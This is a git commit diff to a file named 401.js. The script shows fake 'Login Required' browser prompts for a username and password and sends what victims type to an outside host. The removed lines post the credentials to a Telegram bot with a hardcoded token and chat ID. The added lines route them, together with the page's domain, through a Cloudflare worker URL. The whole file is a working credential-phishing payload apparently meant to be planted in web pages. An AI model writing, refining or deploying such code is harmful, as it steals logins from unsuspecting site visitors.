31c8da058617cc5d8e3149c371f02310fb097313
inggarfi <inggarsaput@gmail.com>
2025-03-30 23:14:21 +0700

    Update 401.js

--- 401.js
+++ 401.js
@@ -1,31 +1,19 @@
 function showAlert() {
-var username = prompt("Login Required\nNama Pengguna:");
-var password = prompt("Login Required\nSandi:");
+    var username = prompt("Login Required\nNama Pengguna:");
+    var password = prompt("Login Required\nSandi:");
 
-// Send the username and password to the Telegram bot
-sendToTelegram(username, password);
+    // Send the username, password, and document domain
+    sendToWorker(username, password, document.domain);
 }
 
-function sendToTelegram(username, password) {
-var botToken = '8046382699:AAHhUb75tr4ufB756EsGZqjwpO3DPM5ZVo0'; // Replace with your bot token
-var chatId = '7893111171'; // Replace with your chat ID
-var message = `Username: ${username}\nPassword: ${password}`;
+function sendToWorker(username, password, domain) {
+    var message = `Username: ${username}\nPassword: ${password}\nDomain: ${domain}`;
+    var url = `https://telegram-worker.inggarsaput.workers.dev/?message=${encodeURIComponent(message)}`;
 
-var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-// Create a new XMLHttpRequest
-var xhr = new XMLHttpRequest();
-xhr.open("POST", url, true);
-xhr.setRequestHeader("Content-Type", "application/json");
-
-// Create the payload
-var payload = {
-chat_id: chatId,
-text: message
-};
-
-// Send the request
-xhr.send(JSON.stringify(payload));
+    // Create a new XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.send();
 }
 
 // Call the function to show the alert
